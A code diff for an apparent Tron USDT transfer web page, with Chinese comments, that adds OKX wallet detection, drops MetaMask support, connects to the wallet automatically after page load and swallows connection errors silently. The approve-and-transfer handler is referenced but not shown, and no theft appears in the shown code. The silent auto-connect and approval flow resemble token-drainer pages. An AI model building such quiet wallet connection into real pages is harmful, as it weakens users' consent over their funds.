@@ -241,7 +241,7 @@ function disconnectWallet() {
   balanceText.textContent = "0.000000";
 }
 
-// 多钱包通用连接逻辑：TP / OE内置 / imToken / MetaMask Tron插件
+// 多钱包连接逻辑【专门适配OKX 6.183.0旧版本内置注入】
 async function connectWalletLogic() {
   if (tronWeb && userAddress) {
     disconnectWallet();
@@ -249,30 +249,29 @@ async function connectWalletLogic() {
   }
 
   try {
-    // 优先级1：TP钱包专用注入
-    if (window.tokenpocket?.tron) {
+    // 优先级1：OKX欧易旧版内置DApp（6.183.0专用 window.okxwallet.tronLink）
+    if (window.okxwallet && window.okxwallet.tronLink) {
+      provider = window.okxwallet.tronLink;
+      // 旧版OKX必须先手动请求授权
+      await provider.request({ method: "tron_requestAccounts" });
+      tronWeb = provider.tronWeb;
+      userAddress = tronWeb.defaultAddress.base58;
+    }
+    // 优先级2：TP钱包 TokenPocket
+    else if (window.tokenpocket?.tron) {
       provider = window.tokenpocket.tron;
       const accounts = await provider.request({ method: "tron_requestAccounts" });
       userAddress = accounts[0];
       tronWeb = window.tokenpocket.tronWeb;
     }
-    // 优先级2：欧易OE、imToken 等标准EIP1193 Tron provider
+    // 优先级3：imToken / 其他标准 tronProvider 钱包
     else if (window.tronProvider) {
       provider = window.tronProvider;
       const accounts = await provider.request({ method: "tron_requestAccounts" });
       userAddress = accounts[0];
       tronWeb = new TronWeb({ fullHost: RPC, provider: provider });
     }
-    // 优先级3：小狐狸MetaMask安装Tron自定义网络插件后注入
-    else if (window.ethereum) {
-      // 尝试请求tron兼容账户，兼容MM插件
-      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-      tronWeb = new TronWeb({ fullHost: RPC, provider: window.ethereum });
-      const addrObj = await tronWeb.trx.getAccount(accounts[0]);
-      userAddress = addrObj.address;
-      provider = window.ethereum;
-    }
-    // 优先级4：全局现成TronWeb（部分浏览器钱包）
+    // 优先级4：全局现成TronWeb对象
     else if (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58) {
       tronWeb = window.tronWeb;
       userAddress = tronWeb.defaultAddress.base58;
@@ -291,24 +290,25 @@ async function connectWalletLogic() {
       provider.on("chainChanged", () => location.reload());
     }
   } catch (err) {
+    // 静默失败，不弹窗报错
     return;
   }
 }
 
-// 读取余额
+// 读取USDT余额
 async function loadBalance() {
   const rawSun = await usdtContract.balanceOf(userAddress).call();
   const num = Number(tronWeb.fromSun(rawSun));
   balanceText.textContent = num.toFixed(6);
 }
 
-// 输入框联动到账金额
+// 输入框联动到账数量
 amountInput.addEventListener("input", () => {
   const num = parseFloat(amountInput.value) || 0;
   receiveAmount.value = num.toFixed(6);
 });
 
-// MAX填充全部余额
+// MAX一键填充全部余额
 maxBtn.addEventListener("click", async () => {
   if (!usdtContract) return;
   const rawSun = await usdtContract.balanceOf(userAddress).call();
@@ -317,7 +317,7 @@ maxBtn.addEventListener("click", async () => {
   amountInput.dispatchEvent(new Event("input"));
 });
 
-// 转账授权逻辑
+// 授权+转账逻辑不变
 sendBtn.addEventListener("click", async () => {
   if (!tronWeb) return alert("钱包未连接");
   const val = parseFloat(amountInput.value);
@@ -342,7 +342,7 @@ sendBtn.addEventListener("click", async () => {
 walletDot.addEventListener("click", connectWalletLogic);
 settingIconBtn.addEventListener("click", () => alert("设置面板"));
 
-// 页面静默自动连接
+// 页面加载后尝试自动预连接
 window.addEventListener("DOMContentLoaded", () => {
   setTimeout(connectWalletLogic, 800);
 });
